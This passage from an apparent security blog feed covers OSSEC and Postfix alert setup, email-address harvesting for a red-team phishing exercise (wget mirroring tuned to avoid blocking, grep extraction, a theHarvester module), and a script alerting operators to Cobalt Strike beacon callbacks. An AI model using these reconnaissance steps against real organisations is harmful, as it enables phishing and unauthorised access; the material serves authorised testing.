&lt;p&gt;Decoder.xml is probably one of the most important files to understand in order to customize the functionality of this software to your environment. Briefly explained, it is the file which dictates which files are to be monitored by OSSEC. The basic method for adding logs to the file is:&lt;/p&gt;

&lt;p&gt;&lt;filename to be logged: EX”**&lt;mail&gt;**”&amp;gt;&lt;/p&gt;

&lt;p&gt;&lt;log_format&gt;syslog&lt;/log_format&gt; &lt;strong&gt;(syslog is the default format but “snort-full, snort-fast, squid, iis, eventlog, and eventchannel are also allowed)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;location&gt;absolute/path/to/log&lt;/location&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&amp;lt;/mail&lt;/strong&gt;&amp;gt;&lt;/p&gt;

&lt;p&gt;The second part of this file includes custom decoders. The default path to this file is /var/ossec/etc. This file is explained thoroughly by OSSEC on their documentation link. &lt;a href=&#34;Http://ossec-docs.readthedocs.org&#34;&gt;Http://ossec-docs.readthedocs.org&lt;/a&gt; According to OSSEC, they are broken into phases, with the first phase performing the pre-decoding. The structure is:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;decoder name=&#34;ossec-exampled&#34;&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;** &lt;program_name&gt;ossec-exampled&lt;/program_name&gt;**&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;/decoder&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Phase 2 now correctly identifies this log message as coming from ossec-exampled. There is still some very important information in the log message that should be decoded, namely the source IP and test-protocol1. To decode these a child decoder will be added. It will set the ossec-exampled decoder as a parent, and use prematch to limit its use to the correct log message.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;decoder name=&#34;ossec-exampled-test-connection&#34;&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;** &lt;parent&gt;ossec-exampled&lt;/parent&gt;**&lt;/p&gt;

&lt;p&gt;** &lt;prematch offset=&#34;after_parent&#34;&gt;^test connection &lt;/prematch&gt; &lt;!-- offset=&#34;after_parent&#34; makes OSSEC ignore anything matched by the parent decoder and before --&gt;**&lt;/p&gt;

&lt;p&gt;** &lt;regex offset=&#34;after_prematch&#34;&gt;^from (\S+) via (\S+)$&lt;/regex&gt; &lt;!-- offset=&#34;after_prematch&#34; makes OSSEC ignore anything matched by the prematch and earlier--&gt;**&lt;/p&gt;

&lt;p&gt;** &lt;order&gt;srcip, protocol&lt;/order&gt;**&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;/decoder&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Breaking this down piece by piece:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;decoder name=&#34;ossec-exampled-test-connection&#34;&gt; - Declaring this to be a decoder and giving it a name.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;parent&gt;ossec-exampled&lt;/parent&gt; - This decoder will only be checked if ossec-exampled also matched.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;prematch offset=&#34;after_parent&#34;&gt;^test connection &lt;/prematch&gt; - If a log message does not contain the data in the prematch, it will not use that decoder. Setting the offset tells OSSEC to only look at data after the parent (ossec-exampled[9123]: in this case), in an effort to speed up matches.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;regex offset=&#34;after_prematch&#34;&gt;^from (\S+) via (\S+)$&lt;/regex&gt; - The regex line can be used to pull data out of the log message for use in rules. In this instance the first \S+ matches the IP address, and the second matches the protocol. Anything between the parenthesis will be able to be used in rules.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;order&gt;srcip, protocol&lt;/order&gt; - Defines what the entries in the regex line are labeled as. The IP address will be labeled as srcip, and the protocol by proto.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The photo below is an actual screenshot of the structure of the decoder.xml file.&lt;/p&gt;

&lt;p&gt;** &lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/xmlfile.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/xmlfile.png&#34; alt=&#34;xmlfile&#34; /&gt;&lt;/a&gt;
**&lt;/p&gt;

&lt;p&gt;For this post, the decoder.xml file will be the primary focus. Try adding custom entries to capture alerts for log-files for thirdparty software that you’ve added yourself. Remember to restart ossec after you’ve made changes and use the OSSEC documentation link provided above for additional instructions. We will address future customization techniques in future posts.&lt;/p&gt;

&lt;p&gt;The final part for this setup will be installing and configuring postfix. Start by entering “&lt;strong&gt;sudo apt-get install postfix and sudo apt-get install mailutils&lt;/strong&gt;&amp;rdquo; into your shell.&lt;/p&gt;

&lt;h1 id=&#34;see-usr-share-postfix-main-cf-dist-for-a-commented-more-complete-version&#34;&gt;See /usr/share/postfix/main.cf.dist for a commented, more complete version&lt;/h1&gt;

&lt;h1 id=&#34;debian-specific-specifying-a-file-name-will-cause-the-first&#34;&gt;Debian specific: Specifying a file name will cause the first&lt;/h1&gt;

&lt;h1 id=&#34;line-of-that-file-to-be-used-as-the-name-the-debian-default&#34;&gt;line of that file to be used as the name. The Debian default&lt;/h1&gt;

&lt;h1 id=&#34;is-etc-mailname&#34;&gt;is /etc/mailname.&lt;/h1&gt;

&lt;h1 id=&#34;myorigin-etc-mailname&#34;&gt;myorigin = /etc/mailname&lt;/h1&gt;

&lt;p&gt;smtpd_banner = $myhostname ESMTP $mail_name (Ubuntu)&lt;/p&gt;

&lt;p&gt;biff = no&lt;/p&gt;

&lt;p&gt;appending .domain is the MUA&amp;rsquo;s job.&lt;/p&gt;

&lt;p&gt;append_dot_mydomain = no&lt;/p&gt;

&lt;h1 id=&#34;uncomment-the-next-line-to-generate-delayed-mail-warnings&#34;&gt;Uncomment the next line to generate &amp;ldquo;delayed mail&amp;rdquo; warnings&lt;/h1&gt;

&lt;h1 id=&#34;delay-warning-time-4h&#34;&gt;delay_warning_time = 4h&lt;/h1&gt;

&lt;p&gt;readme_directory = no&lt;/p&gt;

&lt;h1 id=&#34;tls-parameters&#34;&gt;TLS parameters&lt;/h1&gt;

&lt;p&gt;smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem&lt;/p&gt;

&lt;p&gt;smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key&lt;/p&gt;

&lt;p&gt;smtpd_use_tls=yes&lt;/p&gt;

&lt;p&gt;smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache&lt;/p&gt;

&lt;p&gt;smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache&lt;/p&gt;

&lt;h1 id=&#34;see-usr-share-doc-postfix-tls-readme-gz-in-the-postfix-doc-package-for&#34;&gt;See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for&lt;/h1&gt;

&lt;h1 id=&#34;information-on-enabling-ssl-in-the-smtp-client&#34;&gt;information on enabling SSL in the smtp client.&lt;/h1&gt;

&lt;p&gt;smtpd_tls_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem&lt;/p&gt;

&lt;p&gt;smtpd_tls_key_file=/etc/ssl/private/ssl-cert-snakeoil.key&lt;/p&gt;

&lt;p&gt;smtpd_use_tls=yes&lt;/p&gt;

&lt;p&gt;smtpd_tls_session_cache_database = btree:${data_directory}/smtpd_scache&lt;/p&gt;

&lt;p&gt;smtp_tls_session_cache_database = btree:${data_directory}/smtp_scache&lt;/p&gt;

&lt;h1 id=&#34;see-usr-share-doc-postfix-tls-readme-gz-in-the-postfix-doc-package-for-1&#34;&gt;See /usr/share/doc/postfix/TLS_README.gz in the postfix-doc package for&lt;/h1&gt;

&lt;h1 id=&#34;information-on-enabling-ssl-in-the-smtp-client-1&#34;&gt;Information on enabling SSL in the smtp client.&lt;/h1&gt;

&lt;p&gt;smtpd_relay_restrictions = permit_mynetworks permit_sasl_authenticated defer_un$&lt;/p&gt;

&lt;p&gt;myhostname = localhost&lt;/p&gt;

&lt;p&gt;alias_maps = hash:/etc/aliases&lt;/p&gt;

&lt;p&gt;alias_database = hash:/etc/aliases&lt;/p&gt;

&lt;p&gt;myorigin = /etc/mailname&lt;/p&gt;

&lt;p&gt;mydestination = CyberSyndicates.com, CyberSyndicates-OSSEC, localhost.localdoma$&lt;/p&gt;

&lt;p&gt;relayhost =&lt;/p&gt;

&lt;p&gt;mynetworks = 127.0.0.0/8 [::ffff:127.0.0.0]/104 [::1]/128&lt;/p&gt;

&lt;p&gt;mailbox_size_limit = 0&lt;/p&gt;

&lt;p&gt;recipient_delimiter = +&lt;/p&gt;

&lt;p&gt;inet_interfaces = localhost&lt;/p&gt;

&lt;p&gt;inet_protocols = all
Each of the lines above is in the main.conf file by default. There are a few changes that should be made to fit your particular email address and system information. View the entries that are in bold. These highlighted configs are important, especially the TLS section which contains some of the important information that will facilitate the encrypted connection to gmail.&lt;/p&gt;

&lt;p&gt;The lines below are not added by default and should be added manually or copied and changed to fit your custom information. They are to be placed at the bottom of the main.conf file.&lt;/p&gt;

&lt;p&gt;##################   Added by Me #######################&lt;/p&gt;

&lt;p&gt;smtp_tls_loglevel =1&lt;/p&gt;

&lt;p&gt;smtp_tls_security_level=encrypt&lt;/p&gt;

&lt;p&gt;smtp_sasl_auth_enable=yes&lt;/p&gt;

&lt;p&gt;smtp_sasl_password_maps=hash:/etc/postfix/sasl/passwd&lt;/p&gt;

&lt;p&gt;smtp_sasl_security_options = noanonymous&lt;/p&gt;

&lt;p&gt;######################## map slacker007@localhost to slacker007.dev@gmail.com #$&lt;/p&gt;

&lt;p&gt;smtp_generic_maps=hash:/etc/postfix/generic&lt;/p&gt;

&lt;p&gt;relayhost=[smtp.gmail.com]:587&lt;/p&gt;

&lt;p&gt;In addition to adding the lines above and making all of the configurations you will also create two files (If they don’t already exist on your system and add the following lines)&lt;/p&gt;

&lt;p&gt;Type vi   /etc/postfix/sasl/passwd&lt;/p&gt;

&lt;p&gt;Add the following:&lt;/p&gt;

&lt;p&gt;[smtp.gmail.com]:587 &lt;a href=&#34;mailto:USERNAME@gmail.com:YOUR_PASSWORD&#34;&gt;USERNAME@gmail.com:YOUR_PASSWORD&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Save and exit vi&lt;/p&gt;

&lt;p&gt;Run the following two commands:&lt;/p&gt;

&lt;p&gt;sudo chmod 400 /etc/postfix/sasl/passwd&lt;/p&gt;

&lt;p&gt;sudo postmap /etc/postfix/sasl/passwd&lt;/p&gt;

&lt;p&gt;cat  /etc/ssl/certs/Thawt_Premium_Server_CA.pem | sudo tee –a /etc/postfix/cacert.pem&lt;/p&gt;

&lt;p&gt;sudo /etc/init.d/postfix reload&lt;/p&gt;

&lt;p&gt;finally test your mail by entering the command below:&lt;/p&gt;

&lt;p&gt;echo “Test email | mail –s “Test Mail” &lt;a href=&#34;mailto:youremail@gmail.com&#34;&gt;youremail@gmail.com&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;If you have not seen the email show up in your email’s inbox, check the junk mail folder. If it is not there, check the /var/log/mail.log file on your system go to the bottom of the file and copy and paste the messages that refer to the email attempt to this blog and ask any questions you may have.&lt;/p&gt;

&lt;p&gt;This configuration may seem like a small step but the amount of power gained with a properly configured active response setup is enormous. Below are some images of this system and the test email and some alerts that were generated from it. In addition to those images, are some additional images that contain the results of one of my research VPS’s and the types of alerts that it gets HOURLY..!!!!! It is attacked several times per hour by IP addresses from all over the world. The system built during this write-up was constructed in a lab behind a firewall so therefore there were no “attack or scan” alerts generated.&lt;/p&gt;

&lt;p&gt; &lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/hashnotification.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/hashnotification-300x175.png&#34; alt=&#34;hashnotification&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/failedSSHD.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/failedSSHD.png&#34; alt=&#34;failedSSHD&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/ReverseMapping1.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/ReverseMapping1.png&#34; alt=&#34;ReverseMapping&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The alerts from the VPS !!!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CHECK OUT WHERE THE IP ADDRESSES ABOVE RESOLVED TO…..!!!!!!!!!!!!!!!!!!!!!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt; &lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/chinaIP.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/chinaIP-300x153.png&#34; alt=&#34;chinaIP&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/honkong.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/honkong.png&#34; alt=&#34;honkong&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Get additional information from:&lt;/p&gt;

&lt;p&gt;**OSSEC. &lt;strong&gt;[&lt;/strong&gt;&lt;a href=&#34;http://ossec-docs.readthedocs.org/en/latest/manual/rules-decoders/create-custom.html**](http://ossec-docs.readthedocs.org/en/latest/manual/rules-decoders/create-custom.html&#34;&gt;http://ossec-docs.readthedocs.org/en/latest/manual/rules-decoders/create-custom.html**](http://ossec-docs.readthedocs.org/en/latest/manual/rules-decoders/create-custom.html&lt;/a&gt;)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Harvesting with HTML Scraping Module: theHarvester</title>
      <link>http://dev.cybersyndicates.com/2015/06/email-harvesting-with-html-scraping-module-theharvester/</link>
      <pubDate>Sun, 14 Jun 2015 01:26:31 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/06/email-harvesting-with-html-scraping-module-theharvester/</guid>
      <description>

&lt;p&gt;After a recent Red Team training , I was faced with a issue where I had to conduct a Email phishing campaign to gain initial access using Email Harvesting. This isn&amp;rsquo;t anything necessarily new or a subject that has been touched on a million times. But my goal wasn&amp;rsquo;t to recreate the wheel or create a entirely new tool. I knew from past engagements that there are some great tools like &lt;a href=&#34;http://www.edge-security.com/theharvester.php&#34;&gt;theHarvester&lt;/a&gt; project out there:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-11-at-9.32.34-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-11-at-9.32.34-PM.png&#34; alt=&#34;Screen Shot 2015-06-11 at 9.32.34 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But I came across a ridiculous issue; I had no access to external net. Only internal web servers for the cyber range we where conducting the training in. This scenario isn&amp;rsquo;t as unrealistic as you may think, you could be on an internal network assessment and may have to gain secondary access through different means if phishing is in scope. In this case with the limited network ability the target surface was limited and quite small, but yet we didn&amp;rsquo;t have access to the normal means of recon. Using the extended set of options of the harvester can yield some great results, but all of its current modules are online dependent. With search options using Google and Bing you can gather tons of data, but these functions wouldn&amp;rsquo;t help me a bit.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-11-at-10.51.51-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-11-at-10.51.51-PM.png&#34; alt=&#34;Screen Shot 2015-06-11 at 10.51.51 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h5 id=&#34;current-search-options-for-theharvester&#34;&gt;(Current Search Options for TheHarvester)&lt;/h5&gt;

&lt;p&gt;So I knew I wasn&amp;rsquo;t going to search a page head-to-toe when time counts. The obvious email address&amp;rsquo;s on the home page is a start, but I needed something fast and that would yield a 100 percent insurance that I had all the emails required to conduct the lab. Of course it was time for some simple command line kung-fu!&lt;/p&gt;

&lt;h3 id=&#34;step-by-step-execution&#34;&gt;Step-By-Step Execution&lt;/h3&gt;

&lt;p&gt;Here are the preliminary steps I took to begin searching a domain for Email addresses:**_&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;First I started off knowing that I needed to clone the website for the ability to search and browse the site for other info I may need down the road. I knew theHarvester had no offline ability so I moved to Wget. This command bellow will allow you to reclusively mirror a site:&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code&gt;wget --directory-prefix=/root/Desktop/ --domains target.com --recursive --no-clobber --page-requisites --html-extension --convert-links --restrict-file-names=windows www.target.com



--directory-prefix=/root/Desktop/   ==  Allows you to specify the output location of the cloned site (wget outputs a dir)

--recursive == Follows links and directory structure, by default has a depth of 5

--level=1500 == The depth (directory structure) you want the recursive search to go. **You may want to add this**

--wait=5 == Sets the time to wait between request, helps to not get blocked by pesky admins **You may want to add this**

--limit-rate=10K == sets max bandwidth for wget to consume, helps to not get blocked by pesky admins **May want to add this**

--read-timeout=15 == Sets max time spent attempting to download file before it moves on **You may want to add this**

--no-clobber == Incase you have to restart it won&#39;t overwrite what has been saved

--page-requisites == Download all the files that are necessary to properly display a given HTML page

--html-extension == download CSS files as well

--convert-links  == Convert the links in the document to make them suitable for local viewing

--domains target.com == Sets you scope so you don&#39;t follow links outside the target domain
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next step is to parse this data and grep for any email addresses within the HTML source code. This is relativity easy to accomplish when recessively searching for the data.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    grep -r &amp;quot;@&amp;quot; | grep -i -o &#39;[A-Z0-9._%+-]\+@[A-Z0-9.-]\+\.[A-Z]\{2,4\}&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;-r &amp;quot;@&amp;quot; == Using the -r will recursively search the directory
-i == Perform case insensitive matching sources
-o == Show only the part of a matching line that matches PATTERN.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-12-at-2.05.03-PM.png&#34; alt=&#34;Screen Shot 2015-06-12 at 2.05.03 PM&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this point I was able to simply output line by line the email address&amp;rsquo;s I gathered and still had a mirrored site for further recon if needed.&lt;/p&gt;

&lt;h3 id=&#34;automation&#34;&gt;Automation&lt;/h3&gt;

&lt;hr /&gt;

&lt;p&gt;I knew at this point that I wanted a easy way to do this and at the same time I knew that making some simple script wouldn&amp;rsquo;t help anyone. So I set off to add this function into the harvester so other could use this simple way of gathering email addresses.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-9.10.24-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-9.10.24-PM.png&#34; alt=&#34;Screen Shot 2015-06-13 at 9.10.24 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After looking at the code for roughly a few hours I knew that adapting this particular function wasn&amp;rsquo;t going to be hard, but I knew I had to match the coding style of Christian Martorella otherwise it would never get added. So I set off and built a simple way of automating this. I did run into a few problems when it came to recursive mirroring in pythons current modules. With documented issues with proxies and VPN support in Urlib, this was really a turn off for me as I may be using a VPN to conduct work. Well nothing seemed to do it near as good as Wget implemented it. So using pythons &lt;em&gt;sub.process&lt;/em&gt; module was going to be the most effective way of implementation and was supported on almost any nix system.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.43.00-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.43.00-PM.png&#34; alt=&#34;Screen Shot 2015-06-13 at 8.43.00 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Some other major issues were using default values in the current command line parser. Currently theHarvester doesn&amp;rsquo;t use &lt;em&gt;argparse&lt;/em&gt; so I had in a few nasty if statements (If anyone knows a better way please let me know bellow!).&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.47.00-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.47.00-PM.png&#34; alt=&#34;Screen Shot 2015-06-13 at 8.47.00 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;lastly a simple demo:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.50.04-PM.png&#34; alt=&#34;Screen Shot 2015-06-13 at 8.50.04 PM&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;python theHarvester.py -d www.puttargethere.com -b html-source
or more advance options:
python theHarvester.py -d www.puttargethere.com -b html-source -j 10 -w 3 -r 200k -i 3 -o /foo/bar/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see the output format hasn&amp;rsquo;t changed and would simple be another option to add:
&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-13-at-8.50.30-PM.png&#34; alt=&#34;Screen Shot 2015-06-13 at 8.50.30 PM&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;note&#34;&gt;NOTE:&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;As of today I will be forking, and creating a branch for a pull request. Hopefully he would add in the module I built! If not it won&amp;rsquo;t hurt my feelings.. You can always come download &lt;a href=&#34;https://github.com/killswitch-GUI/theHarvester/tree/Html_source&#34;&gt;my forked version on Git&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Sources:&lt;/p&gt;

&lt;p&gt;[*] &lt;a href=&#34;http://www.linuxjournal.com/content/downloading-entire-web-site-wget&#34;&gt;http://www.linuxjournal.com/content/downloading-entire-web-site-wget&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;[*] &lt;a href=&#34;https://github.com/laramies/theHarvester&#34;&gt;https://github.com/laramies/theHarvester&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SMS-LogAlert.py - Alerting TeamServer Infrastructure</title>
      <link>http://dev.cybersyndicates.com/2015/06/sms-log-alert/</link>
      <pubDate>Wed, 10 Jun 2015 18:27:50 +0000</pubDate>
      
      <guid>http://dev.cybersyndicates.com/2015/06/sms-log-alert/</guid>
      <description>

&lt;p&gt;Recently on a red team engagement we where faced with a major issue during our initial access attempts while email phishing. We kept getting our Cobalt Strike (CS) beacon call backs to our team server at weird hours of the night, inherently missing the beacon and we were out of luck. The worst part was this was just about all we had to work with and we needed initial access bad!&lt;/p&gt;

&lt;p&gt;With this came a problem, with any problem comes a great idea and some simple code to automate it. After some thought we knew we needed a easy way to alert the team when this payload beaconed home, and alert us that it was time to jump online and get started. Now beacons in CS are memory only, unless some method of persistence is employed. This means upon restart or power cycle access needs to be re-phished if you lose access to the target. But in this case the user was most likely &amp;ldquo;sleeping&amp;rdquo; his computer and thats where the random beacons hitting home where coming from.&lt;/p&gt;

&lt;p&gt;With issue in hand we knew we needed some way to alert the team using &amp;ldquo;out of band&amp;rdquo; communication from the VPS infrastructure we had in place. With this came the idea of sending text messages (SMS) using the SMTP (Email) library in Python. This would easily alert us when he came back up online. We simply set up a IP-Tables rule to handle the work of logging when we had a call back to the server.  After we initiated SMS-LogAlert to tail the file, catch the ip Address, clear the log file, and send out an alert to the team with the IP that hit us. From there we where able to effectively manage our call back and we had a jackpot!&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-10-at-3.36.51-PM.png&#34;&gt;&lt;img src=&#34;http://dev.cybersyndicates.com/wp-content/Screen-Shot-2015-06-10-at-3.36.51-PM.png&#34; alt=&#34;Screen Shot 2015-06-10 at 3.36.51 PM&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;get-here-on-github&#34;&gt;Get here on GitHub:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;git clone https://github.com/killswitch-GUI/SMS-LogAlert
    
Python SMS-LogAlert.py -t 10 -s 1oo -e alex@gmail.com -p 1233 -log /var/log/iptables.log
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;here-is-the-simple-logic&#34;&gt;Here is the simple Logic:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Performs simple check on supplied pass and user&lt;/li&gt;
&lt;li&gt;Opens up log and checks for keyword and strips out Source IP&lt;/li&gt;
&lt;li&gt;Sends SMS and clears log file&lt;/li&gt;
&lt;li&gt;Places the IP in a list so multiple SMS arnt sent on previous IP&amp;rsquo;s&lt;/li&gt;
&lt;li&gt;Insures max SMS count has not been reached&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;features&#34;&gt;Features:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Time to prevent log thrashing&lt;/li&gt;
&lt;li&gt;Allows for custom log alerting&lt;/li&gt;
&lt;li&gt;Supports MIME / or even HTML based alerting&lt;/li&gt;
&lt;li&gt;Supports max SMS count&lt;/li&gt;
&lt;li&gt;Sets specfic log file and time between checks&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;limitations&#34;&gt;Limitations:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;T-Mobile Sucks and doesn&amp;rsquo;t allow SMTP to SMS&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Road Map:&lt;/li&gt;
&lt;li&gt;Script is only allowing gmail as its SMTP server currently (will add in support)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Need to add in IP range Support&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;options&#34;&gt;OPTIONS:&lt;/h3&gt;

&lt;pre&gt;&lt;code&gt;-t = Will tell how long between log checks in Secs, defaults to 10 Secs.

-s = Max SMS texts that can recived before it shuts down, default is 100.

-e = Set required email addr user, ex [ale@email.com](mailto:ale@email.com)

-p = Set required email password

-log = Set a log to parse
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;helpful-data&#34;&gt;Helpful Data:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;AT&amp;amp;T: number@txt.att.net&lt;/li&gt;
&lt;li&gt;T-Mobile: number@tmomail.net&lt;/li&gt;
&lt;li&gt;Verizon: number@vtext.com&lt;/li&gt;
&lt;li&gt;Sprint: number@messaging.sprintpcs.com or number@pm.sprint.com&lt;/li&gt;
&lt;li&gt;Virgin Mobile: number@vmobl.com&lt;/li&gt;
&lt;li&gt;Tracfone: number@mmst5.tracfone.com&lt;/li&gt;
&lt;li&gt;Metro PCS: number@mymetropcs.com&lt;/li&gt;
&lt;li&gt;Boost Mobile: number@myboostmobile.com&lt;/li&gt;
&lt;li&gt;Cricket: number@sms.mycricket.com&lt;/li&gt;
&lt;li&gt;Nextel: number@messaging.nextel.com&lt;/li&gt;
&lt;li&gt;Alltel: number@message.alltel.com&lt;/li&gt;
&lt;li&gt;Ptel: number@ptel.com&lt;/li&gt;
&lt;li&gt;Suncom: number@tms.suncom.com&lt;/li&gt;
&lt;li&gt;Qwest: number@qwestmp.com&lt;/li&gt;
&lt;li&gt;U.S. Cellular: number@email.uscc.net&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Source : &lt;a href=&#34;http://20somethingfinance.com/how-to-send-text-messages-sms-via-email-for-free/&#34;&gt;http://20somethingfinance.com/how-to-send-text-messages-sms-via-email-for-free/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>